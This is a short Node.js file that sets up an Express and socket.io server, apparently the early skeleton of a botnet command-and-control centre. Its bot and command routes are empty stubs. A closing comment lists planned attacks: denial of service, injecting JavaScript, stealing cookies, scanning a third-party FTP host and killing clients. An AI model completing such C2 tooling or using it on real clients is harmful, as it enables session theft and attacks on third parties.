var app = require('express')(),
    http = require('http').Server(app),
    io = require('socket.io')(http),
    config = require('./config.json'),
    exphbs  = require('express-handlebars'),
    liveCommands = {};
app.engine('handlebars', exphbs({defaultLayout: 'main'}));
app.set('view engine', 'handlebars');

// express loads the homepage
app.get('/', function (req, res) {
    res.render('index', { name: 'Tobi',layout: false });
});

app.get('/commands/get', function (req, res) {
    res.json(liveCommands);
});
// app route
app.route('/bot/:id')
    .get(function(req, res, next) {
    //  res.json(...);
}).post(function(req, res, next) {
    // maybe add a new event...
});

app.route('/command/send')
    .get(function(req, res, next) {
    //  res.json(...);
}).post(function(req, res, next) {
    // maybe add a new event...
});
io.on('connection', function(socket){
    console.log('Force commander connected');
    socket.on('chat message', function(msg){
        console.log('message: ' + msg);
    });
});

http.listen(config.listenPort, function(){
    console.log('Command and control center listening on http://localhost:%s', config.listenPort);
});
// list of attacks
// dos
// injectJs: “console.log(‘PAWNEEd’)”,
//	getCookies: true,
//	srvScann: { host: “ftp.ladder.com”, port: “21” },
//killClient: true
